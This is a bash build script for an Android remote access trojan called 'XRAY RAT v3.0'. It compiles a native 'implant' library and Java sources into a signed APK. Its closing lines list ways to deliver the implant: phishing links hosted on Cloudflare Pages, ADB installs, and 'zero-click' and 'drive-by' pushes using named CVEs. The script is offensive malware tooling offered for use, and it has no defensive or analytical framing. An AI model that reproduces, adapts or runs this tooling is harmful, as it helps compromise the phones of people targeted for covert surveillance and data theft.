#!/bin/bash
# ════════════════════════════════════════════════════════════════
# XRAY RAT v3.0 — APK Builder
# Compiles native .so and builds minimal APK
# ════════════════════════════════════════════════════════════════

set -e

# Android NDK path — set this or use environment variable
NDK_PATH="${ANDROID_NDK_HOME:-$HOME/Android/Sdk/ndk/26.1.10909125}"
TOOLCHAIN="$NDK_PATH/toolchains/llvm/prebuilt/linux-x86_64"
API_LEVEL=26

echo "[*] XRAY RAT v3.0 — Building implant APK"
echo "[*] Using NDK: $NDK_PATH"

# 1. Compile native .so for ARM64 (primary target)
echo "[*] Compiling native implant (arm64)..."
$TOOLCHAIN/bin/aarch64-linux-android${API_LEVEL}-clang \
    -O2 -fPIC -shared \
    -I "$NDK_PATH/sysroot/usr/include" \
    -I "$NDK_PATH/sysroot/usr/include/arm-linux-androideabi" \
    -Wl,-soname=libxray.so \
    -Wl,--gc-sections \
    -Wl,-z,relro,-z,now \
    -s \
    -o libs/arm64-v8a/libxray.so \
    rat_service.c \
    -llog -landroid

echo "[*] ARM64 binary size: $(ls -lh libs/arm64-v8a/libxray.so | awk '{print $5}')"

# 2. Compile for ARM (older devices)
echo "[*] Compiling native implant (armeabi-v7a)..."
$TOOLCHAIN/bin/armv7a-linux-androideabi${API_LEVEL}-clang \
    -O2 -fPIC -shared \
    -I "$NDK_PATH/sysroot/usr/include" \
    -Wl,-soname=libxray.so \
    -Wl,--gc-sections \
    -s \
    -o libs/armeabi-v7a/libxray.so \
    rat_service.c \
    -llog -landroid

# 3. Build Java sources
echo "[*] Compiling Java bytecode..."
javac -d obj \
    -source 8 -target 8 \
    -classpath "$ANDROID_SDK_HOME/platforms/android-${API_LEVEL}/android.jar" \
    src/com/xray/rat/*.java

# 4. Package DEX
echo "[*] Converting to DEX..."
dx --dex --output=classes.dex obj/

# 5. Build APK with aapt2
echo "[*] Building APK..."
aapt2 compile -o res.zip res/ -v
aapt2 link -o xray-unsigned.apk \
    -I "$ANDROID_SDK_HOME/platforms/android-${API_LEVEL}/android.jar" \
    --manifest AndroidManifest.xml \
    classes.dex \
    libs/arm64-v8a/libxray.so \
    libs/armeabi-v7a/libxray.so

# 6. Sign with debug key
echo "[*] Signing APK..."
apksigner sign --ks ~/.android/debug.keystore \
    --ks-key-alias androiddebugkey \
    --ks-pass pass:android \
    xray-unsigned.apk \
    --out xray-rat-v3.apk

echo ""
echo "[+] BUILD COMPLETE"
echo "[+] Output: xray-rat-v3.apk"
echo "[+] Size: $(ls -lh xray-rat-v3.apk | awk '{print $5}')"
echo ""
echo "Deployment options:"
echo "  1. ADB install:  adb install xray-rat-v3.apk"
echo "  2. Phishing:     Host on Cloudflare Pages and send link"
echo "  3. Zero-click:   Use CVE-2026-0073 to push via ADB wirelessly"
echo "  4. Drive-by:     Use CVE-2026-46242 to escalate and install"
